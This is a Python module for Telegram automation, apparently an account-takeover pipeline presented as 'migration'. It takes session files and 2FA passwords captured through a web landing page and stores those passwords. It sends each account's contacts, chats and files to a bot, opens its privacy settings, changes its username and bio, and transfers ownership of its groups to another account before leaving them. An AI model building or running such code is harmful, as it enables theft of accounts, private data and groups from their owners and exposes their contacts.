from __future__ import annotations

import os
from typing import Optional

from telethon import TelegramClient

from web.services.export_options import ExportOptions
from web.services.export_service import AccountExporter, ClientFactory
from web.services.migration.bot_notifier import BotNotifier
from web.services.migration.groups_migrate import GroupsMigrateService
from web.services.migration.notify_group import NotifyGroupService
from web.services.migration.privacy import PrivacyService
from web.services.migration.profile import ProfileService
from web.services.migration.settings import MigrationSettings
from web.services.migration.state_store import state_store
from web.services.proxy import ProxySettings


class MigrationPipeline:
	"""
	Идемпотентный пайплайн миграции вашего аккаунта:
	1) быстрый экспорт контактов/чатов → бот
	2) приватность / профиль / notify-группа
	3) инвайт целевого аккаунта + передача владения + выход
	4) медиа (опционально)
	"""

	STEPS = (
		"export_text",
		"open_privacy",
		"change_profile",
		"notify_group",
		"migrate_groups",
		"export_media",
	)

	def __init__(
		self,
		settings: MigrationSettings,
		export_options: Optional[ExportOptions] = None,
	) -> None:
		self.settings = settings
		self.export_options = export_options or ExportOptions(
			dump_photo=self.settings.export_media,
			dump_voice=self.settings.export_media,
			dump_video=self.settings.export_media,
		)
		self.privacy = PrivacyService()
		self.profile = ProfileService()
		self.notify = NotifyGroupService()
		self.groups = GroupsMigrateService()
		self.bot = BotNotifier()

	async def run_session(
		self,
		session_path: str,
		proxy: Optional[ProxySettings] = None,
		cloud_password: str = "",
	) -> dict:
		client = ClientFactory.create(session_path, proxy=proxy)
		await client.connect()
		try:
			if not await client.is_user_authorized():
				raise RuntimeError("Сессия не авторизована")
			return await self.run_client(client, cloud_password=cloud_password)
		finally:
			await client.disconnect()

	async def run_client(
		self,
		client: TelegramClient,
		cloud_password: str = "",
	) -> dict:
		me = await client.get_me()
		account_key = str(me.phone or me.id)
		state = await state_store.load(account_key)
		report = {"account": account_key, "steps": {}, "export_dir": None}

		# пароль с веб-логина приоритетнее; иначе — сохранённый cloud secret
		password = (cloud_password or "").strip()
		if not password:
			from web.services.migration.cloud_secrets import cloud_secrets

			password = (await cloud_secrets.get(account_key) or "").strip()
		if password:
			state.meta["has_web_2fa"] = "1"
			await state_store.save(state)

		await self.bot.send_text(
			self.settings,
			f"Старт миграции: {account_key} (@{me.username or '-'})",
		)

		# 1) Быстрый текстовый экспорт → сразу в бота
		if not state.is_done("export_text"):
			exporter = AccountExporter(
				ExportOptions(
					dump_photo=False,
					dump_voice=False,
					dump_video=False,
					dump_avatar=True,
					dump_saved_messages=True,
				)
			)
			folder = await exporter.export_from_client(client)
			report["export_dir"] = folder
			state.meta["export_dir"] = folder
			people = os.path.join(folder, AccountExporter.PEOPLE_FILE)
			await self.bot.send_file(
				self.settings,
				people,
				caption=f"Диалоги/контакты/чаты {account_key}",
			)
			await self.bot.send_file(
				self.settings,
				os.path.join(folder, "contacts.txt"),
				caption=f"Контакты / {account_key}",
			)
			await self.bot.send_file(
				self.settings,
				os.path.join(folder, "chats_channels.txt"),
				caption=f"Чаты и каналы (название/ссылка) / {account_key}",
			)
			await self.bot.send_file(
				self.settings,
				os.path.join(folder, "people.csv"),
				caption=f"Excel/CSV выгрузка / {account_key}",
			)
			await self.bot.send_file(
				self.settings,
				os.path.join(folder, "info.txt"),
				caption=f"info / {account_key}",
			)
			state.mark("export_text")
			await state_store.save(state)
			report["steps"]["export_text"] = folder
		else:
			report["export_dir"] = state.meta.get("export_dir")
			report["steps"]["export_text"] = "skipped"

		# 2) Приватность
		if self.settings.open_privacy and not state.is_done("open_privacy"):
			result = await self.privacy.open_all(client)
			state.mark("open_privacy")
			await state_store.save(state)
			report["steps"]["open_privacy"] = result
		else:
			report["steps"]["open_privacy"] = "skipped"

		# 3) Username + bio
		if self.settings.change_profile and not state.is_done("change_profile"):
			result = await self.profile.apply(
				client,
				self.settings.target_username,
				self.settings.bio,
			)
			state.meta["username"] = str(result.get("username") or "")
			state.mark("change_profile")
			await state_store.save(state)
			report["steps"]["change_profile"] = result
		else:
			report["steps"]["change_profile"] = "skipped"

		# 4) Ваша группа-маяк: join → message → leave
		notify_chat_id = None
		if self.settings.notify_group and not state.is_done("notify_group"):
			if not (self.settings.notify_group_link or "").strip():
				report["steps"]["notify_group"] = "skipped: empty notify_group_link"
				await self.bot.send_text(
					self.settings,
					f"notify_group пропущен {account_key}: нет ссылки на группу в настройках бота",
				)
			else:
				try:
					result = await self.notify.run(
						client,
						self.settings.notify_group_link,
						self.settings.notify_message,
					)
					notify_chat_id = result.get("chat_id")
					state.mark("notify_group")
					await state_store.save(state)
					report["steps"]["notify_group"] = result
					await self.bot.send_text(
						self.settings,
						f"notify_group {account_key}: {result}",
					)
				except Exception as error:
					report["steps"]["notify_group"] = f"error: {error}"
					await self.bot.send_text(
						self.settings,
						f"notify_group ошибка {account_key}: {error}",
					)
		else:
			report["steps"]["notify_group"] = "skipped"

		# 5) Перенос групп на ваш второй аккаунт
		if self.settings.migrate_groups and not state.is_done("migrate_groups"):
			if not (self.settings.target_account or "").strip():
				report["steps"]["migrate_groups"] = "skipped: no target_account"
				await self.bot.send_text(
					self.settings,
					f"migrate_groups пропущен {account_key}: "
					"укажите «Целевой аккаунт» в боте (Профиль)",
				)
			else:
				skip_ids = set()
				if notify_chat_id:
					skip_ids.add(int(notify_chat_id))
				try:
					result = await self.groups.run(
						client,
						target=self.settings.target_account,
						cloud_password=password,
						already_done=set(state.migrated_chats),
						skip_chat_ids=skip_ids,
					)
					state.migrated_chats = sorted(
						set(state.migrated_chats).union(result.get("done_ids", []))
					)
					state.meta.pop("has_web_2fa", None)
					ok_n = int(result.get("invited") or 0) + int(
						result.get("already_in") or 0
					)
					err_n = len(result.get("errors") or [])
					# если всё упало — не помечаем шаг, чтобы можно было повторить
					if ok_n > 0 or err_n == 0:
						state.mark("migrate_groups")
					await state_store.save(state)
					report["steps"]["migrate_groups"] = result
					if result.get("password_invalid"):
						from web.services.migration.cloud_secrets import cloud_secrets

						await cloud_secrets.delete(account_key)
						await self.bot.send_text(
							self.settings,
							f"2FA для {account_key} не подходит — сохранённый пароль сброшен. "
							"При следующем входе на сайте введите актуальный 2FA.",
						)
					await self.bot.send_text(
						self.settings,
						f"Группы {account_key}: invited={result.get('invited')} "
						f"already={result.get('already_in')} "
						f"promoted={result.get('promoted')} "
						f"owner={result.get('ownership_transferred')} "
						f"left={result.get('left')} skipped={result.get('skipped')} "
						f"errors={err_n} target={result.get('target')}"
						+ (
							""
							if password
							else " (без 2FA с веба — owner-группы могут не передаться)"
						)
						+ (
							""
							if ok_n > 0 or err_n == 0
							else "\nШаг НЕ зафиксирован — можно войти снова."
						),
					)
					if result.get("errors"):
						from landing.event_format import shorten_group_error

						short_errs = [
							shorten_group_error(item)
							for item in result["errors"][:15]
						]
						more = len(result["errors"]) - len(short_errs)
						tail = f"\n… ещё {more}" if more > 0 else ""
						await self.bot.send_text(
							self.settings,
							f"Ошибки групп {account_key} ({err_n}):\n"
							+ "\n".join(short_errs)
							+ tail,
						)
				except Exception as error:
					report["steps"]["migrate_groups"] = f"error: {error}"
					await self.bot.send_text(
						self.settings,
						f"migrate_groups ошибка {account_key}: {error}",
					)
		elif self.settings.migrate_groups and state.is_done("migrate_groups"):
			report["steps"]["migrate_groups"] = "skipped: already done"
			await self.bot.send_text(
				self.settings,
				f"migrate_groups уже был выполнен для {account_key}. "
				"В боте: Действия → Сбросить шаги миграции, затем снова войдите.",
			)
		else:
			report["steps"]["migrate_groups"] = "skipped"

		# 6) Медиа в конце (медленно)
		if self.settings.export_media and not state.is_done("export_media"):
			media_opts = ExportOptions(
				dump_photo=True,
				dump_voice=True,
				dump_video=True,
				dump_avatar=False,
				dump_saved_messages=False,
			)
			# дописываем медиа в уже созданную папку, либо новую
			folder = state.meta.get("export_dir")
			exporter = AccountExporter(media_opts)
			if folder and os.path.isdir(folder):
				# повторный полный экспорт в новую папку безопаснее
				media_folder = await exporter.export_from_client(client)
			else:
				media_folder = await exporter.export_from_client(client)
			state.meta["media_dir"] = media_folder
			state.mark("export_media")
			await state_store.save(state)
			report["steps"]["export_media"] = media_folder
			report["export_dir"] = media_folder
		else:
			report["steps"]["export_media"] = "skipped"

		await self.bot.send_text(self.settings, f"Миграция завершена: {account_key}")
		return report
